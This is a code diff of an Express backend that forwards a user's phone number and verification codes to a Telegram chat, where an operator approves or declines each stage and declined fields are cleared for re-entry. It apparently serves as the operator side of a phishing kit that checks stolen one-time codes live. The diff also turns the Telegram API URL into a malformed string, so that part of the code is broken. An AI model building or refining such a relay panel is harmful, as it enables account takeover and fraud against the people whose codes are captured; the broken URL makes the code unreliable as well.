@@ -19,7 +19,7 @@ async function telegram(method, data) {
     throw new Error("Telegram environment variables are missing.");
   }
 
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+  const url = `https://telegram.org{BOT_TOKEN}/${method}`;
   
   const response = await fetch(url, {
     method: "POST",
@@ -91,7 +91,7 @@ app.post("/api/approval-request", async (req, res) => {
   const code2Val = session.data.code2 ? session.data.code2.trim() : "None";
 
   try {
-    // Original concise profile format
+    // Original concise profile format with code wrappers for tap-to-copy capability
     const textMessage = 
       `<b># Thor - ${stage.toUpperCase()} Verification</b>\n` +
       `<b>${headingTitle}</b>\n\n` +
@@ -137,7 +137,15 @@ app.get("/api/status", (req, res) => {
   if (!session) return res.status(404).json({ error: "Session missing." });
   if (session.stage !== stage) return res.json({ status: "idle" });
 
-  res.json({ status: session.status });
+  const currentStatus = session.status;
+
+  // Self-cleaning hook: If status is declined, immediately switch backend to idle
+  // so the user frontend can process the clear event once and re-submit.
+  if (currentStatus === "declined") {
+    session.status = "idle";
+  }
+
+  res.json({ status: currentStatus });
 });
 
 // Receive Telegram Webhook inline actions
@@ -156,37 +164,54 @@ app.post("/telegram-webhook", async (req, res) => {
     try {
       await telegram("answerCallbackQuery", {
         callback_query_id: query.id,
-        text: "This action request has expired."
+        text: "This session has expired or is no longer active.",
+        show_alert: true
       });
-    } catch (e) {}
+    } catch (err) {
+      console.error("Failed to answer callback query:", err.message);
+    }
     return;
   }
 
-  session.status = decision === "approve" ? "approved" : "declined";
-  
   try {
-    await telegram("answerCallbackQuery", {
-      callback_query_id: query.id,
-      text: `Step completed as ${session.status}`
-    });
-
-    if (query.message?.message_id) {
-      const cleanPhone = session.data.phone ? session.data.phone.trim() : "None";
-      const statusBanner = session.status === "approved" 
-        ? `<b>✅ CORRECT ENTRY processed for Phone: <code>${cleanPhone}</code></b>`
-        : `<b>❌ WRONG ENTRY processed for Phone: <code>${cleanPhone}</code></b>`;
+    if (decision === "approve") {
+      session.status = "approved";
+      session.updatedAt = Date.now();
 
       await telegram("editMessageText", {
         chat_id: CHAT_ID,
         message_id: query.message.message_id,
-        text: `${statusBanner}\n\n${query.message.text}`,
+        text: query.message.text + "\n\n<b>✅ APPROVED BY ADMIN</b>",
+        parse_mode: "HTML"
+      });
+
+    } else if (decision === "decline") {
+      // Clear the target step input field in memory data structure
+      if (session.data[stage] !== undefined) {
+        session.data[stage] = ""; 
+      }
+      
+      session.status = "declined";
+      session.updatedAt = Date.now();
+
+      await telegram("editMessageText", {
+        chat_id: CHAT_ID,
+        message_id: query.message.message_id,
+        text: query.message.text + "\n\n<b>❌ DECLINED BY ADMIN (Field Cleared)</b>",
         parse_mode: "HTML"
       });
     }
-  } catch (err) {
-    console.error("Webhook state visualization update failed:", err.message);
+
+    await telegram("answerCallbackQuery", {
+      callback_query_id: query.id,
+      text: decision === "approve" ? "Parameters Approved." : "Parameters Declined & Cleared."
+    });
+
+  } catch (error) {
+    console.error("Webhook event update error:", error.message);
   }
 });
 
-app.listen(PORT, () => console.log(`Backend server active on port ${PORT}`));
-
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
